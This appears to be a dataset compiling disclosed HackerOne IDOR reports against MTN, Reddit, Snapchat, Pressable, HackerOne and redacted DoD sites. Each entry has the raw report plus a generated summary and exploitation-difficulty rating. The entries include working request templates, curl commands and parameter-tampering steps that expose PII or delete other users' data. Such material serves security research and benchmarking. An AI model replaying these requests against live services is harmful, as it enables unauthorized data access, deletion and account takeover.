This vulnerability allows any user to remove other users, including admins and owners, from their teams by exploiting an Insecure Direct Object Reference (IDOR) issue. Additionally, the response discloses sensitive information such as usernames and team names.

Steps to Reproduce:
1. Create three accounts (A, B, C) on developers.mtn.com
2. Login to account A and invite account B to Team A
3. Login to account B and invite account C to Team B
4. Intercept the request to remove account B from Team A using Burp Suite
5. Modify the intercepted request to target account C in Team B by changing user_id and team_id
6. Send the modified request to remove account C from Team B
Exploitation Difficulty:
The attack involves multiple steps including account creation, team invitations, and request interception/modification. While the steps are straightforward, the interaction between the components (user_id and team_id manipulation) is non-obvious and requires understanding of the application's team management logic.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/1489470: Authorization bypass -> IDOR -> PII Leakage
================================================================================
RAW DESCRIPTION:

Hi team!
During testing ████ I found javascript file containing administrative panel functionality.
It is accessible at:
https://████/█████████
In this file I found an end point responsible for returning data about applications of the website users to the website administrators.
The returned data contains PII data (Full name, phone and email) of military personnel, and or their family members.
References
Steps to reproduce:
Run following curl command to retrieve data:
curl https://███/███ -X POST -data="url=%2F████████" -k
Modifying ██████████ parameter result in different Application being returned.
I have tested retrieving following ids: █████.
Trying to retrieve record 60000 returns no information, so maybe ~50000 applications are accessible.
Impact
PII leak of military personnel and family members
System Host(s)
█████████
Affected Product(s) and Version(s)
/█████████
CVE Numbers
Steps to Reproduce
Run following command to retrieve data:
curl https://███████/███ -X POST -data="url=%2F████████" -k
Modifying ██████ parameter result in different Application being returned.
I have tested retrieving following ids: ███.
Trying to retrieve record 60000 returns no information, so maybe ~50000 applications are accessible.
Suggested Mitigation/Remediation Actions
admin.js should be available only after Administrator successfully logs in
all administrative end points must check if authorized administrator is requesting them



================================================================================
Vulnerability Description:
The vulnerability involves an IDOR (Insecure Direct Object Reference) issue in an administrative endpoint that allows unauthorized access to PII (Personally Identifiable Information) of military personnel and their family members by manipulating the application ID parameter in the request.

Steps to Reproduce:
1. Run the curl command: curl https://███████/███ -X POST -data="url=%2F████████" -k
2. Modify the ██████ parameter to retrieve different application records
Exploitation Difficulty:
The vulnerability is straightforward to discover as it involves a direct manipulation of a parameter in a request to access unauthorized data. The attack does not require complex interactions or understanding of multiple components, making it relatively simple to identify and exploit.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/1536936: Unprotected Direct Object Reference
================================================================================
RAW DESCRIPTION:

Hello MTN Security Team,
During my hunting,
I discovered that there's an Insecure Direct Object Reference on https://nin.mtnonline.com
Vulnerable Path: https://nin.mtnonline.com/nin/success?message=1
Steps To Reproduce:
You may not even require to submit any NIN before accessing this unprotected page,
Just visit https://nin.mtnonline.com/nin/success?message=1
I discovered that, to see other user's NIN, it only require 2 difference , example
https://nin.mtnonline.com/nin/success?message=3
https://nin.mtnonline.com/nin/success?message=5
https://nin.mtnonline.com/nin/success?message=7
https://nin.mtnonline.com/nin/success?message=9
https://nin.mtnonline.com/nin/success?message=11
https://nin.mtnonline.com/nin/success?message=1901
https://nin.mtnonline.com/nin/success?message=1903
https://nin.mtnonline.com/nin/success?message=8001
Impact
This bug exposed all the submitted Nigerians National Identity Number (NIN) .which can be abused in other way else if found out by a malicious person



================================================================================
Vulnerability Description:
The vulnerability is an Insecure Direct Object Reference (IDOR) on https://nin.mtnonline.com, where changing the 'message' parameter in the URL exposes different users' National Identity Numbers (NINs) without proper authorization.

Steps to Reproduce:
1. Visit the vulnerable URL: https://nin.mtnonline.com/nin/success?message=1
2. Increment the 'message' parameter to access other users' NINs, e.g., https://nin.mtnonline.com/nin/success?message=3
Exploitation Difficulty:
The attack is straightforward, involving only the manipulation of a single parameter in the URL to access sensitive data. There are no complex interactions or states involved, and the vulnerability is easily reproducible with minimal steps.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/1626508: IDOR leading unauthenticated attacker to download documents discloses PII of users and soldiers via https://www.█████████/Download.aspx?id= [HtUS]
================================================================================
RAW DESCRIPTION:

Summary:
Hey team, I have found this API endpoint leads to leaking attachments and documents of users. The attachments leaked are banks taxes, contracts, PII such as full address and mobile number, emails, etc. The vulnerable URL is at [https://www.████████/Download.aspx?id=4675]
Steps To Reproduce:
[add details for how we can reproduce the issue]
Go to this URL [https://www.█████████/Download.aspx?id=4675]
Add any desired id
then you will see a variety of sensitive files and contracts which contain PIIs and other classified documents
Impact
An unauthenticated attacker is able to obtain PII of users and soldiers also an attacker is able to leak classified documents



================================================================================
Vulnerability Description:
An Insecure Direct Object Reference (IDOR) vulnerability allows an unauthenticated attacker to access sensitive documents (e.g., bank taxes, contracts, PII) by manipulating the 'id' parameter in the URL. This exposes personal data such as full addresses, mobile numbers, emails, and classified documents.

Steps to Reproduce:
1. Navigate to the vulnerable URL: https://www.█████████/Download.aspx?id=4675
2. Modify the 'id' parameter in the URL to access different documents (e.g., https://www.█████████/Download.aspx?id=4676)
Exploitation Difficulty:
The vulnerability is straightforward to exploit as it only requires modifying a single parameter in the URL. There are no complex interactions, state manipulations, or novel logic involved.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/1658418: Getting access of mod logs from any public or restricted subreddit with IDOR vulnerability
================================================================================
RAW DESCRIPTION:

Summary:
There's no check if the user is moderator of the particular subreddit or not while trying to access the mod logs via gql.reddit.com by using operation id. You can change the parameter subredditName to any target subreddit name which is public or restricted and get access to mod logs of that subreddit.
Steps To Reproduce:
Log into any account as an attacker and get the authorization token
Send request given below at gql.reddit.com
Code 510 Bytes
1POST / HTTP/2
2Host: gql.reddit.com
3User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
4Accept: */*
5Accept-Language: en-US,en;q=0.5
6Accept-Encoding: gzip, deflate
7Content-Type: application/json
8Content-Length: 62
9X-Reddit-Compression: 1
10Origin: https://www.reddit.com
11Sec-Fetch-Dest: empty
12Sec-Fetch-Mode: cors
13Sec-Fetch-Site: same-site
14Authorization: Bearer ourtoken
15Referer: https://www.reddit.com/
16Te: trailers
17
18{"id":"6243efcbc61d","variables":{"subredditName":"any-subreddit"}}
<image_0>
It only gives one page of logs.Look at the response and see if the value of hasNextPage is true or false. If It's false then there are no more logs other than the ones we got
<image_1>
Final request body will look something like this
Code 99 Bytes
1{"id":"6243efcbc61d","variables":{"subredditName":"any-subreddit",
2"after":"code-from-endCursor"
3}}
After sending the request we'll get second page of logs. If we still get hasNextPage as true, Keep doing this untill we see hasNextPage set to false in the response. by doing this we can get all the pages of mod logs one by one.
Use this script to make things easier in confirming this vulnerability (mod_logs.sh (F1851561))
The output will get stored in mod_log_out.txt in the same directory
[attachment / reference]
responsebody1.png (F1851522)
endCursorCode.png (F1851533)
mod_logs.sh (F1851561)
Impact
Confidential information getting exposed.



================================================================================
Vulnerability Description:
The vulnerability is an Insecure Direct Object Reference (IDOR) issue where an attacker can access mod logs of any public or restricted subreddit by changing the 'subredditName' parameter in a GraphQL request to gql.reddit.com, without any verification of moderator status.

Steps to Reproduce:
1. Log into any account as an attacker and obtain the authorization token.
2. Send a POST request to gql.reddit.com with the operation ID and the target subreddit name in the variables.
3. Check the response for 'hasNextPage' and if true, use the 'after' parameter with the 'endCursor' code to fetch subsequent pages of logs until 'hasNextPage' is false.
Exploitation Difficulty:
The attack involves a straightforward manipulation of a single parameter in a GraphQL request. The steps are linear and do not require complex interactions or state manipulations. The logic is not novel and is commonly seen in IDOR vulnerabilities.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/1661113: IDOR allows an attacker to modify the links of any user
================================================================================
RAW DESCRIPTION:

Hi team!
I found an IDOR which allows to modify the links of any user.
Users can put their custom links or social media links on their profile, ex:
<image_0>
To reproduce this:
Replicate the following request by replacing it with your own authentication headers: You must also put in the body of the request, in the parameter "username" the username that you want, you can try my username: "criptexhackerone1". This request will return in the response the links of any user profile with the "id" of each link.
Code 935 Bytes
1POST / HTTP/2
2Host: gql.reddit.com
3Content-Length: 62
4Sec-Ch-Ua: ".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"
5X-Reddit-Loid:  * * ** * * * * * * * * * * ** * *  * * * * * * * * *  * * * * *  *
6Sec-Ch-Ua-Mobile: ?0
7Authorization: Bearer * * * * * * *  * * * * * * * * * * * * * * * * * * * * * * * * *  * * * * *  *
8Content-Type: application/json
9User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/531.36
10X-Reddit-Compression: 1
11X-Reddit-Session:  * * * * * * * * *  * * * * *  * * * * * * * * * *  * * * * *  *
12Sec-Ch-Ua-Platform: "Windows"
13Accept: */*
14Origin: https://www.reddit.com
15Sec-Fetch-Site: same-site
16Sec-Fetch-Mode: cors
17Sec-Fetch-Dest: empty
18Referer: https://www.reddit.com/
19Accept-Encoding: gzip, deflate
20Accept-Language: es-ES,es;q=0.9,en-US;q=0.8,en;q=0.7,bs;q=0.6,ja;q=0.5
21
22{"id":"11a239b07f86","variables":{"username":"*********"}}
When you get some "id" save it.
In the next request you have to put in the request body, in the "id" parameter the previously saved id, you can also change the name and the link:
Code 902 Bytes
1POST / HTTP/2
2Host: gql.reddit.com
3User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20000101 Firefox/101.0
4Accept: */*
5Accept-Language: es-AR,es;q=0.8,en-US;q=0.5,en;q=0.3
6Accept-Encoding: gzip, deflate
7Content-Type: application/json
8Content-Length: 173
9X-Reddit-Loid: * * * * * * * * *  * * * * *  * * * * * * * * * *  * * * * *  *
10X-Reddit-Session: * * * * * * * * *  * * * * *  * * * * * * * * * *  * * * * *  *
11X-Reddit-Compression: 1
12Origin: https://www.reddit.com
13Sec-Fetch-Dest: empty
14Sec-Fetch-Mode: cors
15Sec-Fetch-Site: same-site
16Authorization: Bearer * * * * * * * * *  * * * * *  * * * * * * * * * *  * * * * *  *
17Referer: https://www.reddit.com/
18Te: trailers
19
20{"id":"c558e604581f","variables":{"input":{"socialLinks":[{"outboundUrl":"https://www.hackerone.com","title":"hacker","type":"CUSTOM","id":"* * * * * * * * *  * * * * *  * * * * * * * * * *  * * * * *  *"}]}}}
Finally re-enter the victim's profile and you will see the modified links. It is important to mention that you may have to reload the page a few times or wait a few seconds.
Impact
A real attacker can modify the name and content of any user's social links. It is important to add that social links are something main in user profiles, if an attacker exploits this with all reddit users it could be devastating.
Best Regards!!!



================================================================================
Vulnerability Description:
An Insecure Direct Object Reference (IDOR) vulnerability allows an attacker to modify the social media links of any user profile by manipulating the link IDs obtained from a GraphQL request.

Steps to Reproduce:
1. Send a POST request to / with authentication headers and specify the target username in the body to retrieve the user's link IDs.
2. Send another POST request with the retrieved link ID in the body to modify the link's name and URL.
Exploitation Difficulty:
The vulnerability involves straightforward manipulation of object references without proper authorization checks. The steps are clear and do not require complex interactions or understanding of subtle application states.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/1695454: IDOR in API applications (able to see any API token, leads to account takeover)
================================================================================
RAW DESCRIPTION:

Summary:
Hi,
@ehtis, thank you for the test account. Here is a critical report. :)
On Pressable, we can create API applications at https://my.pressable.com/api/applications, and we can access many things using the API token via following the API docs
I created an API application and tried to update it, I saw this request :
████████
As you can see there is an application[id] parameter that contains the application ID. I changed it to my second account's application ID and that API app moved to my account. So, there is an IDOR but it doesn't have a great impact because it just removes the API application from the victim's account.
So I tried to escalate its impact and I noticed if we remove all parameters except application[id] and authenticity_token, then send the request, the endpoint gives an error with Name must be provided and prints the given application ID's page. And, that page contains Client ID and Client Secret!
With this information, the attacker can make many actions on the victim's account. (https://my.pressable.com/documentation/api/v1)
Steps To Reproduce:
Go to https://my.pressable.com/api/applications and create an API app
Click on the application and turn on your proxy program
Click Update and you will send a POST request to /api/applications
In this request, change the application%5Bid%5D parameter's value to the target app ID, then remove all parameters except application%5Bid%5D and authenticity_token
The page will give an error and you will see the victim app's page which contains Client ID and Client Secret
Now, you can use these API credentials on the Pressable API.
Notes:
API application IDs are sequential, so the attacker doesn't have to guess the IDs, s/he can access all applications
The impact is critical because we can access many things via the API, that includes the "collaborator" endpoint https://my.pressable.com/documentation/api/v1#collaborator-bulk-create
Impact
The attacker can access all API credentials using this vulnerability, and that leads to account takeover (via adding collaborator etc.)
Regards,
Bugra



================================================================================
Vulnerability Description:
This vulnerability is an Insecure Direct Object Reference (IDOR) in the API applications endpoint of Pressable. By manipulating the application ID in a POST request and removing certain parameters, an attacker can access the Client ID and Client Secret of any API application, leading to potential account takeover.

Steps to Reproduce:
1. Go to https://my.pressable.com/api/applications and create an API app
2. Click on the application and turn on your proxy program
3. Click Update and you will send a POST request to /api/applications
4. In this request, change the application%5Bid%5D parameter's value to the target app ID, then remove all parameters except application%5Bid%5D and authenticity_token
5. The page will give an error and you will see the victim app's page which contains Client ID and Client Secret
6. Now, you can use these API credentials on the Pressable API.
Exploitation Difficulty:
The vulnerability involves manipulating a POST request to expose sensitive information. While the steps are straightforward, the discovery requires understanding the API behavior and the impact of parameter manipulation, which is not immediately obvious.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/1744264:  read and message other user's messages
================================================================================
RAW DESCRIPTION:

go to your account's chat page, stop the request and change the reddit session parameter, now leave the request and you will be able to access the test account's chat screen
send the request to the repeater change the reddit session parameter and send it then you will see the return result is 200
show reply in browser and copy and paste the address into your browser you will access the chat page of your test account
Impact
other users' chat screen can be accessed
and message can be sent



================================================================================
Vulnerability Description:
This vulnerability allows an attacker to access and interact with another user's chat by intercepting and modifying the session parameter in the request. This leads to unauthorized access to private messages and the ability to send messages as the victim.

Steps to Reproduce:
1. Go to your account's chat page and intercept the request using a proxy tool like Burp Suite.
2. Modify the 'reddit session' parameter in the intercepted request to that of another user's session and forward the request.
3. Observe the response (200 OK) and open the chat page in the browser using the modified session to access another user's chat.
4. Send messages from the intercepted session as if you were the other user.
Exploitation Difficulty:
The attack involves intercepting and modifying a session parameter, which is a straightforward manipulation of HTTP requests. The steps are linear and do not require understanding complex application states or novel logic.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/1819832: Delete anyone's content spotlight remotely.
================================================================================
RAW DESCRIPTION:

Hello Snapchat,
Snapchat has viral video feature callled spotlight which alone was the biggest trend and increase snapchat users and profit in millions.
I found a way to delete anyone's spotlight remotely.
Please see the below poc:-
First go to https://my.snapchat.com/myposts and log in there.
You will see your posts .
Now turn burp suite and intercept. 4.Select any of your posts and click delete option.
Now capture the delete request. In delete request there is parameter of id
{"operationName":"DeleteStorySnaps","variables":{"ids":["███████"],"storyType":"SPOTLIGHT_STORY"},"query":"mutation DeleteStorySnaps($ids: [String!]!, $storyType: StoryType!) {\n deleteStorySnaps(ids: $ids, storyType: $storyType)\n}\n"}
You just have to change this id parameter. You can easily get the id parameter. Now forward the request after replacing id with someone's else video id.
And the video of other user will get delete.
HOW TO GET ID PARAMETER
Whenever you share spotlight you can see the parameter in the url as: https://story.snapchat.com/spotlight/█████
I have attached a video POC please check it out
Impact
Delete anyone's Content Spotlight. Imagine deleting video biggest influencers and content creators.



================================================================================
Vulnerability Description:
This vulnerability allows an attacker to delete any user's Spotlight video remotely by intercepting and modifying the delete request. The attack involves replacing the 'id' parameter in the request with the target video's ID, which can be easily obtained from the video's URL.

Steps to Reproduce:
1. Go to https://my.snapchat.com/myposts and log in.
2. Turn on Burp Suite and intercept the request when deleting a post.
3. Capture the delete request and note the 'id' parameter in the JSON payload.
4. Replace the 'id' parameter with another user's Spotlight video ID obtained from the URL (e.g., https://story.snapchat.com/spotlight/█████).
5. Forward the modified request to delete the targeted user's Spotlight video.
Exploitation Difficulty:
The vulnerability involves intercepting and modifying a straightforward HTTP request, which is a common technique in web application testing. The steps are linear and do not require complex interactions or deep understanding of the application's state or logic. The only non-trivial part is identifying the correct 'id' parameter, but this is easily found in the video URL.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/1848176: IDOR in TalentMAP API can be abused to enumerate personal information of all the users
================================================================================
RAW DESCRIPTION:

Summary:
I hope you're having a good day. Before starting to describe this vulnerability, I would like to thank the HackerOne triage team for doing the difficult job of triaging all these issues.
I observed an IDOR vulnerability in one of the endpoints in the Talentmap API. This vulnerability is similar to #1809328. In this report I will demonstrate ways to enumerate all user accounts in the Talentmap API logged in as a guest user. To triage this vulnerability, you need to manually build it in your system, the build instructions can be accessed in the report #1809328 where HackerOne team has successfully built the Talentmap API. However, if you're having issues building it, drop a message!
After building the API, please go inside the docker container and run the following commands to create_seeded_users.
$ python manage.py create_demo_environment
$ python manage.py create_seeded_users
Also, go into the docker container and create some test users:
$ python manage.py create_user normalUser normaluser@gmail.com normalUser123 Normal User
$ python manage.py create_user normalUser1 normaluser1@gmail.com normalUser123 Normal User
$ python manage.py create_user normalUser2 normaluser2@gmail.com normalUser123 Normal User
Some details:
i. The vulnerable endpoint = http://localhost:8000/api/v1/permission/user/{USER_ID}/
Steps To Reproduce:
[add details for how we can reproduce the issue]
After running the API, browse http://localhost:8000 and login using the credentials username: guest , password: guestpassword , and copy the token obtained in the respones
<image_0>
<image_1>
Send the following request to http://localhost:8000. Replace {USER_ID} to the user id of the user you want to enumerate information of. Replace {token} to the token you obtained in step 1
Code 372 Bytes
1GET /api/v1/permission/user/{USER_ID}/ HTTP/1.1
2
3Host: localhost:8000
4User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
5Accept: application/json
6Accept-Language: en-US,en;q=0.5
7Accept-Encoding: gzip, deflate
8Referer: http://localhost:8000/
9JWT: {token}
10Connection: close
11Sec-Fetch-Dest: empty
12Sec-Fetch-Mode: cors
13Sec-Fetch-Site: same-origin
Observe user information returned in the response
Additionally, you could also use Burp intruder to cycle through user-ids from 1 to 100 to get information of all users in the database.
<image_2>
Remediation Guidance
Implement access control mechanism. Allow the user to only fetch their information.
Supporting Material/References:
[list any additional material (e.g. screenshots, logs, etc.)]
[attachment / reference]
Impact
A malicious actor could fetch information of all users and cause a data breach



================================================================================
Vulnerability Description:
An Insecure Direct Object Reference (IDOR) vulnerability in the TalentMAP API allows a guest user to enumerate personal information of all users by manipulating the USER_ID parameter in the API endpoint.

Steps to Reproduce:
1. Login to the TalentMAP API as a guest user with credentials username: guest, password: guestpassword and obtain the JWT token from the response.
2. Send a GET request to the endpoint http://localhost:8000/api/v1/permission/user/{USER_ID}/ with the obtained JWT token in the headers, replacing {USER_ID} with the desired user ID to enumerate their information.
Exploitation Difficulty:
The vulnerability involves a straightforward manipulation of the USER_ID parameter without any complex interactions or state manipulations. The attack is simple and does not require understanding of novel or complex application logic.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/1952771: ████ ' can change any account email and cannot retrieve his account and access it ' at ███
================================================================================
RAW DESCRIPTION:

hi ███
i found ██████████ , i can change any account email and he cannot retrieve his account and access it easily.
i can't access to his account because url activation on new email don't work and give me error.
Code 81 Bytes
1SyntaxError: JSON.parse: unexpected character at line 1 column 1 of the JSON data
but hackers will be able to disable access users to their account on the site.
Go to registration page (████)
Verified your account.
Go to login page and login your account.
For the fastly test, use this credentials to login (you can use this account attacker to send request to burp and test on victim's account's i was created)
For Attacker
███████████
Password
███████████ : ███████
For Victim 1
████████████
Password
████ : ██████████
For Victim 2
██████████████
Password
█████████ : ████ For Victim 3
████
Password
██████████
i access to my account victim and i go to edit my profil and send request to burp to get id user for this account ( my method of video for the attacker account is the same that i did on the victim account to get her id user ).
so .. after login i go to edit my account attacker and send request to burp and send it to repeater .. i change my id to victim id and i change email to my new email and click send so i succeeded.
i received an activation message on my new email i click on active url .. despite give me an error message when i click on the link activation
Code 81 Bytes
1SyntaxError: JSON.parse: unexpected character at line 1 column 1 of the JSON data
the change was made successfully and the victim cannot log into his account, as it will give him an error message when he logs in.
i created +5 account victim for testing that and its worked, and can kids hackers to change the id user to anything like 10 or 100 or any number and change email this account for that id user.
burp request
Code 3.42 KiB
1POST /_post/usuario_actualizar.php HTTP/1.1
2Host: ████████
3Cookie: ████
4User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/██████ Firefox/91.0
5Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
6Accept-Language: en-US,en;q=0.5
7Accept-Encoding: gzip, deflate
8Referer: ████████
9Content-Type: multipart/form-data; boundary=---------------------------297392175112058██████████7932062474594
10Content-Length: 2851
11Origin: ███████-Insecure-Requests: 1
12Sec-Fetch-Dest: iframe
13Sec-Fetch-Mode: navigate
14Sec-Fetch-Site: same-origin
15Sec-Fetch-User: ?1
16Te: trailers
17Connection: close
18
19-----------------------------297392175112058█████████████7932062474594
20Content-Disposition: form-data; name="nombre"
21
22attacker
23-----------------------------297392175112058████7932062474594
24Content-Disposition: form-data; name="apellido"
25
26attacker
27-----------------------------297392175112058███████7932062474594
28Content-Disposition: form-data; name="email"
29
30████████████
31-----------------------------297392175112058███████7932062474594
32Content-Disposition: form-data; name="rut"
33
34
35-----------------------------297392175112058███7932062474594
36Content-Disposition: form-data; name="idProvincia"
37
380
39-----------------------------297392175112058███7932062474594
40Content-Disposition: form-data; name="idLocalidad"
41
420
43-----------------------------297392175112058███████████7932062474594
44Content-Disposition: form-data; name="optin[usuario_info_miroyalcanin]"
45
46no
47-----------------------------297392175112058███████████7932062474594
48Content-Disposition: form-data; name="optin[usuario_info_miroyalcanin]"
49
50si
51-----------------------------297392175112058████████7932062474594
52Content-Disposition: form-data; name="optin[usuario_info_marspetcare]"
53
54no
55-----------------------------297392175112058██████████7932062474594
56Content-Disposition: form-data; name="optin[usuario_info_marspetcare]"
57
58si
59-----------------------------297392175112058████7932062474594
60Content-Disposition: form-data; name="optin[usuario_investigaciones]"
61
62no
63-----------------------------297392175112058██████████7932062474594
64Content-Disposition: form-data; name="optin[usuario_investigaciones]"
65
66si
67-----------------------------297392175112058███████7932062474594
68Content-Disposition: form-data; name="optin[usuario_info_perros]"
69
70no
71-----------------------------297392175112058██████7932062474594
72Content-Disposition: form-data; name="optin[usuario_info_perros]"
73
74si
75-----------------------------297392175112058████████7932062474594
76Content-Disposition: form-data; name="optin[usuario_info_gatos]"
77
78no
79-----------------------------297392175112058███████████7932062474594
80Content-Disposition: form-data; name="optin[usuario_info_gatos]"
81
82si
83-----------------------------297392175112058██████████████7932062474594
84Content-Disposition: form-data; name="switch_pass"
85
86off
87-----------------------------297392175112058███7932062474594
88Content-Disposition: form-data; name="ck_oldpass"
89
90Password
91-----------------------------297392175112058███████7932062474594
92Content-Disposition: form-data; name="oldpass"
93
94
95-----------------------------297392175112058████████████7932062474594
96Content-Disposition: form-data; name="clave"
97
98
99-----------------------------297392175112058█████████████7932062474594
100Content-Disposition: form-data; name="clave2"
101
102
103-----------------------------297392175112058███████████7932062474594
104Content-Disposition: form-data; name="█████"
105
10688796
107-----------------------------297392175112058████████7932062474594--
██████
Impact
█████████████



================================================================================
Vulnerability Description:
The vulnerability allows an attacker to change any user's email address by manipulating the user ID in a profile update request. This results in account takeover as the victim loses access to their account, and the attacker gains control, though the email activation link may fail.

Steps to Reproduce:
1. Register an account on the target site and verify it.
2. Log in to the attacker account and navigate to the profile edit page.
3. Intercept the profile update request using Burp Suite.
4. Modify the request to change the user ID to a victim's ID and update the email to a new attacker-controlled email.
5. Submit the modified request, which changes the victim's email without proper authorization.
6. Observe that the victim can no longer access their account, even though the email activation link fails.
Exploitation Difficulty:
The attack involves intercepting and modifying a request, which is a common technique, but requires understanding of how user IDs are handled in the application. The vulnerability stems from insufficient authorization checks when updating user emails.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/1969141: Insecure Direct Object Reference (IDOR) - Delete Campaigns  
================================================================================
RAW DESCRIPTION:

Summary:
Hi Team,
I think I can delete any Campaigns based on campaign_id
Steps To Reproduce
Follow the POST request below
Code 1.49 KiB
1POST /graphql HTTP/2
2Host: hackerone.com
3Cookie: yourcookie
4User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0
5Accept: */*
6Accept-Language: en-US,en;q=0.5
7Accept-Encoding: gzip, deflate
8Referer: https://hackerone.com/organizations/opensea_demo/campaigns/242/edit
9Content-Type: application/json
10X-Csrf-Token: ███
11X-Product-Area: campaigns
12X-Product-Feature: edit
13X-Datadog-Origin: rum
14X-Datadog-Parent-Id: 9027318766950450042
15X-Datadog-Sampling-Priority: 1
16X-Datadog-Trace-Id: 87799383677632658
17Content-Length: 851
18Origin: https://hackerone.com
19Dnt: 1
20Sec-Fetch-Dest: empty
21Sec-Fetch-Mode: cors
22Sec-Fetch-Site: same-origin
23Te: trailers
24
25{"operationName":"UpdateCampaign","variables":{"product_area":"campaigns","product_feature":"edit","input":{"campaign_id":"Z2lkOi8vaGFja2Vyb25lL0NhbXBhaWduLzI0NA==","team_id":"Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpCdWdCb3VudHlQcm9ncmFtLzU3MzI4","bounty_table_row_id":"Z2lkOi8vaGFja2Vyb25lL0JvdW50eVRhYmxlUm93LzEwODM2","start_date":"2023-05-05T09:00:00Z","end_date":"2023-05-08T05:00:00Z","critical":3,"high":2,"medium":1.5,"low":1.5,"structured_scope_ids":[],"researchers_information":"ccccccccccccccc"}},"query":"mutation UpdateCampaign($input: UpdateCampaignInput!) {\n  updateCampaign(input: $input) {\n    was_successful\n    errors {\n      edges {\n        node {\n          id\n          type\n          field\n          message\n          __typename\n        }\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n}\n"}
26
Decode base64 of campaign_id to get gid://hackerone/Campaign/244
Increase or decrease the number after Campaign and re-encode it with base64
At the campaign_id parameter in the request change it to another program's ongoing campaign_id parameter.
Then send Campaign request of any program to be deleted.
Impact
Can delete all Campaign on hackerone or any program



================================================================================
Vulnerability Description:
The vulnerability is an Insecure Direct Object Reference (IDOR) that allows an attacker to delete any campaign by manipulating the campaign_id parameter in a GraphQL request. The system fails to enforce proper authorization checks, enabling unauthorized deletion of campaigns by simply altering the ID of the target campaign.

Steps to Reproduce:
1. Intercept a legitimate request to delete a campaign, noting the campaign_id parameter which is base64 encoded.
2. Decode the base64 campaign_id to understand its structure (e.g., gid://hackerone/Campaign/244).
3. Modify the numeric value in the decoded ID to target another campaign, re-encode it to base64, and replace the original campaign_id in the request.
4. Send the modified request to delete the targeted campaign without proper authorization.
Exploitation Difficulty:
The attack involves straightforward manipulation of a single parameter (campaign_id) in a request. The steps are linear and do not require understanding complex application states or interactions between multiple components. The vulnerability is a classic IDOR, a well-known issue, making its discovery and exploitation relatively simple.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/2122671: IDOR - Delete all Licenses and certifications from users account using CreateOrUpdateHackerCertification GraphQL query
================================================================================
RAW DESCRIPTION:

Summary:
Hey team,
While editing our Licenses and certifications if we change the ID number we can delete other users Licenses and certifications. it simply can be done by editing the ID number in our graphql query.
If change the ID from 1 to X possible range then we can delete all the Licenses and certifications present between these.
Steps To Reproduce
Log in to your own account in two browsers A and B with User A and User B
Create your own *Licenses and certifications in both the account
Now edit your own *Licenses and certifications and Intercept this using a Burp Proxy
Now In the body change the ID number and you will be able to delete all the Licenses and certifications present in HackerOne
For now change the ID to the Licenses and certifications ID of the Other account and it will be deleted.
PoC Video: ████
Impact
Able to delete all the Licenses and certifications present in HackerOne



================================================================================
Vulnerability Description:
This is an Insecure Direct Object Reference (IDOR) vulnerability in the CreateOrUpdateHackerCertification GraphQL query. By manipulating the ID parameter, an attacker can delete any user's licenses and certifications without proper authorization.

Steps to Reproduce:
1. Log in to your own account in two different browsers (User A and User B).
2. Intercept the GraphQL request (CreateOrUpdateHackerCertification) while editing your own licenses/certifications using a proxy tool like Burp.
3. Modify the ID parameter in the request to target another user's licenses/certifications.
4. Send the modified request to delete the target user's licenses/certifications.
Exploitation Difficulty:
The vulnerability is straightforward to discover as it only requires modifying a single parameter (ID) in a GraphQL request. The attack does not involve complex interactions or multiple components, and the logic is commonly seen in IDOR vulnerabilities.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/228383: IDOR on DoD Website exposes FTP users and passes linked to all accounts!
================================================================================
RAW DESCRIPTION:

Description:
https://████/██████/ is vulnerable to Insecure Direct Object Reference. The application does not validate whether or not who a Push Server belongs to thus allowing an attacker to view the credentials of any FTP / sFTP server linked to any user's account.
Impact
An attacker can view anybody's FTP server information, thus compromising the user's FTP servers. This also allows an attacker to update or edit the Push Server in the ██████████ CMS.
Step-by-step Reproduction Instructions
Log into or create an account on https://██████████/██████████
Now visit https://████████/█████/filepush/ftp/303/
You will be able to see my ftp server details and you will be able to update or delete it!
An attacker can bruteforce the id to see if the server gives back a valid response. The attacker can then log into the person's FTP servers with the credentials stolen using this vulnerability, giving them full access to private / confidential information!
Example: https://██████████/█████████/filepush/ftp/1/
Hostname: ██████
Username: ██████
Password: █████
Path: /from_pub/cr/████████
https://█████████/████/filepush/ftp/<ID>/
Suggested Mitigation/Remediation Actions
Check whether or the user's account should have access to the specified Push Server



================================================================================
Vulnerability Description:
The DoD website is vulnerable to Insecure Direct Object Reference (IDOR), allowing unauthorized access to FTP server credentials linked to any user's account. This vulnerability enables an attacker to view, update, or delete FTP server details by manipulating the ID parameter in the URL.

Steps to Reproduce:
1. Log into or create an account on the target DoD website.
2. Visit the URL https://████████/█████/filepush/ftp/303/ to view or manipulate FTP server details of any user by changing the ID parameter.
Exploitation Difficulty:
The vulnerability involves a straightforward manipulation of the ID parameter in the URL, a common and well-documented attack vector. The attack does not require complex interactions or understanding of multiple components, making it relatively easy to discover and exploit.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/2442008: Attachment disclosure via summary report 
================================================================================
RAW DESCRIPTION:

Summary:
